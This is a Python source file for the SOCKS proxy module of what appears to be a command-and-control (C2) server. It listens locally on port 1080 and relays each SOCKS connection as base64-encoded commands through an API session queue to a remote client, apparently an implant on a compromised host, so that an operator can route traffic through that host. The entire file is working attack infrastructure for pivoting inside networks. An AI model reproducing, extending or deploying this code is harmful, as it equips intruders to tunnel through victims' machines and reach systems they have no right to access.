import os, sys
from threading import Thread, Lock
from time import sleep
import socket
import uuid
import requests
from datetime import datetime, timedelta
from base64 import b64encode, b64decode
import struct
import json
from helpers import convert_to_file_time

ApiManager = None

def set_api_manager(apimanager):
	global ApiManager
	ApiManager = apimanager
	return

class ESocksCommsMsgType(object):
    SCMT_PROTO = 0
    SCMT_RELAY = 1
    SCMT_DISCONNECTED = 2
    SCMT_IGNORE = 3

PROTOMSG_HEADER_LENGTH = 48
CPMT_SOCKS_MSG = 8

class C2SocksHandler(Thread):
	def __init__(self, daemon, client_id, conn, addr):
		#print "[Enter] C2SocksHandler.__init__()"
		
		super(C2SocksHandler, self).__init__()
		self.__daemon = daemon
		self.__client_id = client_id
		self.__socket = conn
		self.__addr = addr
		self.__alive = False
		self.__data_in = 0
		self.__data_out = 0
		self.__conn_id = uuid.uuid4()
		self.__lock_notify = Lock()
		
		ApiManager.register_socks_conn(str(self.__conn_id).lower(), self)

		#print "[Exit] C2SocksHandler.__init__()"
		return

	def __parse_socks_cmd_response(self, serialized):
		conn_id = uuid.UUID(bytes_le=serialized[PROTOMSG_HEADER_LENGTH:PROTOMSG_HEADER_LENGTH + 16])
		type = struct.unpack("<I", serialized[PROTOMSG_HEADER_LENGTH + 16:PROTOMSG_HEADER_LENGTH + 20])[0]
		datagram = ""
		if type == ESocksCommsMsgType.SCMT_PROTO or type == ESocksCommsMsgType.SCMT_RELAY:
			length = struct.unpack("<I", serialized[PROTOMSG_HEADER_LENGTH + 20:PROTOMSG_HEADER_LENGTH + 24])[0]
			datagram = serialized[PROTOMSG_HEADER_LENGTH + 24:]
			if length != len(datagram):
				raise Exception("Invalid datagram length")
		return (conn_id, type, datagram)
	
	def notify_message(self, comms_msg):
		with self.__lock_notify:
			conn_id, type, datagram = self.__parse_socks_cmd_response(comms_msg)

			#print "[C2SocksHandler.run] Received datagram length %u: %s" % (len(datagram), b64encode(datagram))
		
			if type == ESocksCommsMsgType.SCMT_PROTO:
				#print "[C2SocksHandler.run] PROTO length %u: %s" % (len(datagram), b64encode(datagram))
				if len(datagram) != 8:
					raise Exception("Invalid PROTO message length")
				self.__socket.send(datagram)
				if ord(datagram[1]) != 90:
					#print "[C2SocksHandler.run] SOCKS connection error (CD != 90).. disconnecting"
					self.shutdown()
			elif type == ESocksCommsMsgType.SCMT_RELAY:
				#print "[C2SocksHandler.run] RELAY length %u: %s" % (len(datagram), b64encode(datagram))
				self.__socket.send(datagram)
			elif type == ESocksCommsMsgType.SCMT_IGNORE:
				#print "[C2SocksHandler.run] IGNORE message"
				pass
			elif type == ESocksCommsMsgType.SCMT_DISCONNECTED:
				#print "[C2SocksHandler.run] Peer DISCONNECTED.. disconnecting"
				self.shutdown()
		return

	def __format_socks_protomsg(self, client_id, message_id, serialized_input):
		payload = client_id.bytes_le												# ClientId
		payload += message_id.bytes_le												# MessageId
		payload += struct.pack("<Q", convert_to_file_time(datetime.now()))			# DateTime
		payload += struct.pack("<I", CPMT_SOCKS_MSG)	# Type
		payload += struct.pack("<I", len(serialized_input))							# Length
		payload += serialized_input													# Buffer
		return payload

	def __format_socks_msg_cmd(self, client_id, message_id, conn_id, type, datagram):
		serialized = struct.pack("<B", 0)
		serialized += conn_id.bytes_le
		serialized += struct.pack("<I", type)
		serialized += struct.pack("<I", len(datagram))
		serialized += datagram
		return self.__format_socks_protomsg(client_id, message_id, serialized)

	def __push_socks_message(self, type, datagram):
		msg_id = uuid.uuid4()
		ApiManager.session_putcommand(
				str(self.__client_id).lower(),
				str(msg_id).lower(),
				b64encode(self.__format_socks_msg_cmd(uuid.UUID(self.__client_id), msg_id, self.__conn_id, type, datagram))
			)
		return

	def shutdown(self, remove_worker = True):
		#print "[Enter] C2SocksHandler.shutdown()"
		
		self.__alive = False
		self.__socket.close()

		self.__push_socks_message(ESocksCommsMsgType.SCMT_DISCONNECTED, "")
		ApiManager.unregister_socks_conn(str(self.__conn_id).lower())

		if remove_worker:
			self.__daemon.remove_worker(self)

		#print "[Exit] C2SocksHandler.shutdown()"
		return

	def run(self):
		#print "[Enter] C2SocksHandler.run()"
		
		self.__alive = True
		while self.__alive:
			try:
			#if True:
				data = ""
				while True:
					try:
						part = self.__socket.recv(65536)
						data += part
						if len(part) < 65536:
							break
					except socket.timeout:
						if data:
							break

				if not data:
					#print "[C2SocksHandler.run] received 0 length data.. disconnecting"
					self.shutdown()

				# push to client via ApiManager ...
				self.__push_socks_message(ESocksCommsMsgType.SCMT_RELAY, data)

			except Exception as ex:
				# socket must be closed
				#print repr(ex)
				self.shutdown()

		#print "[Exit] C2SocksHandler.run()"
		return

	def stats(self):
		return (self.data_in, self.__data_out)

	def alive(self):
		return self.__alive

class C2SocksDaemon(object):
	def __init__(self, client_id, port):
		self.__alive = False
		self.__worker = None
		self.__active_workers = []
		self.__active_workers_lock = Lock()
		self.__client_id = client_id
		self.__port = port
		self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		return

	def __format_socks_protomsg(self, client_id, message_id, serialized_input):
		payload = client_id.bytes_le												# ClientId
		payload += message_id.bytes_le												# MessageId
		payload += struct.pack("<Q", convert_to_file_time(datetime.now()))			# DateTime
		payload += struct.pack("<I", CPMT_SOCKS_MSG)	# Type
		payload += struct.pack("<I", len(serialized_input))							# Length
		payload += serialized_input													# Buffer
		return payload

	def __format_socks_shutdown_cmd(self, client_id, message_id):
		serialized = struct.pack("<B", 1)
		serialized += "\x00" * 16
		serialized += struct.pack("<I", ESocksCommsMsgType.SCMT_IGNORE)
		serialized += struct.pack("<I", 0)
		return self.__format_socks_protomsg(client_id, message_id, serialized)

	def __notify_socks_shutdown(self):
		msg_id = uuid.uuid4()
		ApiManager.session_putcommand(
				str(self.__client_id).lower(),
				str(msg_id).lower(),
				b64encode(self.__format_socks_shutdown_cmd(uuid.UUID(self.__client_id), msg_id))
			)
		return

	def get_port(self):
		return self.__port

	def get_client_id(self):
		return str(self.__client_id).lower()

	def remove_worker(self, worker):
		with self.__active_workers_lock:
			if worker in self.__active_workers:
				self.__active_workers.remove(worker)

	def __serve(self):
		#print "[Enter] C2SocksDaemon.__serve()"
		
		try:
			sock = socket.create_connection(("127.0.0.1", self.__port), 1)
			sock.close()
			return
		except:
			pass

		try:
		#if True:
			self.__socket.bind(("0.0.0.0", self.__port))
			self.__alive = True
			self.__socket.listen(5)

			while self.__alive:
				conn, addr = self.__socket.accept()
				conn.settimeout(2)
				worker = C2SocksHandler(self, self.__client_id, conn, addr)
				with self.__active_workers_lock:
					self.__active_workers.append(worker)
				worker.start()
		except:
			#print "[C2SocksDaemon.__serve] Error listening"
			self.shutdown()
		
		#print "[Exit] C2SocksDaemon.__serve()"
		return

	def serve(self):
		self.__worker = Thread(target=self.__serve)
		self.__worker.start()
		sleep(1)
		return self.__worker.is_alive()

	def shutdown(self):
		#print "[Enter] C2SocksDaemon.shudown()"

		self.__alive = False
		self.__socket.close()

		for worker in self.__active_workers:
			worker.shutdown(False)
			worker.join()
		
		self.__notify_socks_shutdown()

		#print "[Exit] C2SocksDaemon.shudown()"
		return

if __name__ == "__main__":
	daemon = C2SocksDaemon(uuid.UUID("038db2e7-aaec-e95a-fe3a-deecc188fffb"), 1080)
	daemon.serve()
	sleep(60)
	daemon.shutdown()
	#print "Killed"
